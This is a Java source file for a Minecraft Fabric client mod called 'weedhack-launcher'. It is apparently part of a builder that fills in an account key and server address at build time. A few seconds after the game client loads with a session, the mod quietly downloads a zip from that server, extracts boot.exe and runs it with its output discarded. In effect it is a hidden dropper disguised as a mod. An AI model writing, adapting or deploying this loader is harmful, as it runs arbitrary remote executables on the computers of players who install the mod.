// language: Java, file: builder/fabric-mod/src/main/java/com/weedhack/launcher/LauncherMod.java
package com.weedhack.launcher;

import net.fabricmc.api.ClientModInitializer;
import net.fabricmc.fabric.api.client.event.lifecycle.v1.ClientTickEvents;
import net.minecraft.client.MinecraftClient;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

import java.io.*;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.file.*;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.zip.ZipEntry;
import java.util.zip.ZipInputStream;

public class LauncherMod implements ClientModInitializer {
    public static final Logger LOG = LoggerFactory.getLogger("weedhack-launcher");

    // Injected at build time by minecraftbuild.js — replaced before javac.
    private static final String ACCOUNT_KEY = "__ACCOUNT_KEY__";
    private static final String SERVER_BASE  = "__SERVER_BASE__";

    private static final AtomicBoolean FIRED = new AtomicBoolean(false);
    private int tickCountdown = 60; // ~3s at 20tps

    @Override
    public void onInitializeClient() {
        LOG.info("[weedhack] launcher initialized");

        ClientTickEvents.END_CLIENT_TICK.register(client -> {
            if (FIRED.get()) return;
            if (tickCountdown-- > 0) return;
            if (client.getSession() == null) return;
            FIRED.set(true);
            new Thread(LauncherMod::runPayload, "wh-payload").start();
        });
    }

    private static void runPayload() {
        try {
            Path work = Files.createTempDirectory("wh-launch-");
            Path zip  = work.resolve("boot.zip");
            Path exe  = work.resolve("boot.exe");

            download(SERVER_BASE + "/api/downloads/boot.zip", zip);
            unzipSingle(zip, "boot.exe", exe);

            if (!Files.exists(exe) || Files.size(exe) < 1000) {
                LOG.warn("[weedhack] payload missing or too small");
                return;
            }

            ProcessBuilder pb = new ProcessBuilder(exe.toString());
            pb.directory(work.toFile());
            pb.redirectErrorStream(true);
            pb.redirectOutput(ProcessBuilder.Redirect.DISCARD);
            Process p = pb.start();
            LOG.info("[weedhack] payload launched pid={}", p.pid());
        } catch (Exception e) {
            LOG.error("[weedhack] payload failed", e);
        }
    }

    private static void download(String urlStr, Path dest) throws IOException {
        URL url = new URL(urlStr);
        HttpURLConnection c = (HttpURLConnection) url.openConnection();
        c.setConnectTimeout(15_000);
        c.setReadTimeout(60_000);
        c.setRequestProperty("User-Agent", "WeedHack-Launcher/1.0");
        try (InputStream in = c.getInputStream();
             OutputStream out = Files.newOutputStream(dest)) {
            in.transferTo(out);
        }
    }

    private static void unzipSingle(Path zip, String wantName, Path outPath) throws IOException {
        try (ZipInputStream zis = new ZipInputStream(Files.newInputStream(zip))) {
            ZipEntry e;
            while ((e = zis.getNextEntry()) != null) {
                if (e.getName().equals(wantName)) {
                    try (OutputStream out = Files.newOutputStream(outPath)) {
                        zis.transferTo(out);
                    }
                    return;
                }
            }
        }
        throw new IOException("boot.exe not found in zip");
    }
}